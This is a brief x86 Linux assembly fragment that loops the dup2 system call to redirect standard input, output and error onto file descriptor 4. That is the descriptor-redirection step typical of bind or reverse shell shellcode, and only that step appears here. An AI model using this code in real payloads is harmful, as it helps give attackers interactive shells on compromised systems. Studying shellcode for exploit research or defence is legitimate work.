section .text
push 2
pop  ecx
xor ebx, ebx
inc ebx
inc ebx
inc ebx
inc ebx

loop:
xor eax, eax
mov al, 63
int 0x80
dec ecx
jns loop
